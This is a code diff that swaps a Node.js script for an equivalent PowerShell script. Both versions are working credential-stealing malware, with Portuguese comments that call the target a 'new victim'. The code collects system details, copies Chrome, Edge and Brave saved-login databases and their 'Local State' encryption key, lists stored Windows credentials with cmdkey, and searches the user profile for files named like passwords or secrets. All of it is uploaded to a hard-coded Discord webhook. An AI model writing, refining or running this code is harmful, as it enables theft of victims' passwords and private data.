@@ -1,101 +1,76 @@
-const axios = require('axios');
-const fs = require('fs');
-const os = require('os');
-const FormData = require('form-data');
-const { execSync } = require('child_process');
+$webhookUrl = "https://discord.com/api/webhooks/1563550985274531890/nmcjdI8zDoYiEV9aoW7miLtlWHLRr7g1eujQtHya92oSWuVUuJdbgmosATTyYFSz4qAi"
 
-async function sendToWebhook(message, filePath = null) {
-    const webhookUrl = "https://discord.com/api/webhooks/1563550985274531890/nmcjdI8zDoYiEV9aoW7miLtlWHLRr7g1eujQtHya92oSWuVUuJdbgmosATTyYFSz4qAi";
+function Send-ToWebhook {
+    param (
+        [string]$Message, 
+        [string]$FilePath = $null
+    )
 
     try {
-        if (filePath) {
-            const form = new FormData();
-            form.append('content', message);
-            form.append('file', fs.createReadStream(filePath));
-
-            await axios.post(webhookUrl, form, {
-                headers: form.getHeaders(),
-            });
+        if ($FilePath) {
+            # Envia como multipart/form-data para evitar o limite de 2000 caracteres (Erro 400)
+            $form = @{
+                content = $Message
+                file = Get-Item -Path $FilePath
+            }
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $form
         } else {
-            await axios.post(webhookUrl, {
-                content: message,
-            });
+            # Envia como JSON simples para mensagens curtas
+            $payload = @{ content = $Message } | ConvertTo-Json
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
         }
-    } catch (error) {
-        console.error(`Erro ao enviar: ${error.message}`);
+    } catch {
+        Write-Host "Erro ao enviar para o Webhook: $($_.Exception.Message)"
     }
 }
 
-async function main() {
-    try {
-        // 1. Informações do Sistema
-        const username = os.userInfo().username;
-        const hostname = os.hostname();
-        const platform = os.platform();
-        const sysInfo = `--- Nova Vítima Detectada ---\nUsuário: ${username} | PC: ${hostname} | OS: ${platform}`;
-        await sendToWebhook(sysInfo);
+try {
+    # 1. Coleta de Informações Básicas do Sistema
+    $sysInfo = "--- Nova Vítima Detectada ---nUsuário: $(whoami) | PC: $env:COMPUTERNAME | OS: $((Get-WmiObject Win32_OperatingSystem).Caption)"
+    Send-ToWebhook -Message $sysInfo
 
-        // 2. Extração de Navegadores
-        const localAppData = process.env.LOCALAPPDATA || '';
-        const paths = [
-            `${localAppData}\\Google\\Chrome\\User Data\\Default\\Login Data`,
-            `${localAppData}\\Microsoft\\Edge\\User Data\\Default\\Login Data`,
-            `${localAppData}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data`
-        ];
+    # 2. Extração de Navegadores (Chrome, Edge, Brave)
+    $paths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+    )
 
-        for (const path of paths) {
-            if (fs.existsSync(path)) {
-                const browserName = path.split('\\').slice(-3)[1];
-
-                const localStatePath = path.replace("Login Data", "Local State");
-                if (fs.existsSync(localStatePath)) {
-                    await sendToWebhook(`Local State de ${browserName}`, localStatePath);
-                }
-
-                const tempFile = `${os.tmpdir()}login_data_tmp`;
-                fs.copyFileSync(path, tempFile);
-                await sendToWebhook(`Login Data de ${browserName}`, tempFile);
-                fs.unlinkSync(tempFile);
+    foreach ($path in $paths) {
+        if (Test-Path $path) {
+            $browserName = Split-Path (Split-Path $path -Parent) -Leaf
+            
+            # Exfiltra o Local State (Chave de criptografia)
+            $localStatePath = $path.Replace("Login Data", "Local State")
+            if (Test-Path $localStatePath) {
+                Send-ToWebhook -Message "Local State de $browserName" -FilePath $localStatePath
             }
+            
+            # Copia Login Data para arquivo temporário (evita erro de arquivo em uso) e envia
+            $tempFile = "$env:TEMP\login_data_tmp"
+            Copy-Item -Path $path -Destination $tempFile -Force
+            Send-ToWebhook -Message "Login Data de $browserName" -FilePath $tempFile
+            Remove-Item $tempFile
         }
-
-        // 3. Credenciais do Windows
-        try {
-            const creds = execSync('cmdkey /list').toString();
-            if (creds) {
-                await sendToWebhook(`Credenciais do Windows (cmdkey):\n\n${creds}`);
-            }
-        } catch (e) {
-            // Silently fail if cmdkey is not available
-        }
-
-        // 4. Arquivos de Configuração Sensíveis (Simulação de busca recursiva)
-        const userProfile = process.env.USERPROFILE || os.homedir();
-        const sensitiveKeywords = ['pass', 'pwd', 'secret', 'key'];
-        
-        const findSensitiveFiles = (dir) => {
-            const files = fs.readdirSync(dir);
-            files.forEach(file => {
-                const fullPath = `${dir}\\${file}`;
-                try {
-                    const stat = fs.statSync(fullPath);
-                    if (stat.isDirectory()) {
-                        findSensitiveFiles(fullPath);
-                    } else if (/\.(txt|ini|config|env)$/i.test(file)) {
-                        if (sensitiveKeywords.some(k => file.toLowerCase().includes(k))) {
-                            const content = fs.readFileSync(fullPath, 'utf8');
-                            sendToWebhook(`Arquivo Sensível: ${fullPath}\n\n${content}`);
-                        }
-                    }
-                } catch (e) {}
-            });
-        };
-
-        findSensitiveFiles(userProfile);
-
-    } catch (error) {
-        await sendToWebhook(`Erro durante a execução: ${error.message}`);
     }
-}
 
-main();
+    # 3. Coleta de Senhas Salvas no Windows (Credenciais do Cofre)
+    $creds = cmdkey /list | Out-String
+    if ($creds) {
+        Send-ToWebhook -Message "Credenciais do Windows (cmdkey):nn$creds"
+    }
+
+    # 4. Coleta de arquivos de configuração comuns (FTP, SSH, etc)
+    $configFiles = Get-ChildItem -Path "$env:USERPROFILE" -Include *.txt, *.ini, *.config, *.env -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "pass|pwd|secret|key" }
+    foreach ($file in $configFiles) {
+        $content = Get-Content $file.FullName -Raw
+        if ($content.Length -lt 2000) {
+            Send-ToWebhook -Message "Arquivo Sensível: $($file.FullName)n`n$content"
+        } else {
+            Send-ToWebhook -Message "Arquivo Sensível (Grande): $($file.FullName)" -FilePath $file.FullName
+        }
+    }
+
+} catch {
+    Send-ToWebhook -Message "Erro crítico durante a execução: $($_.Exception.Message)"
+}
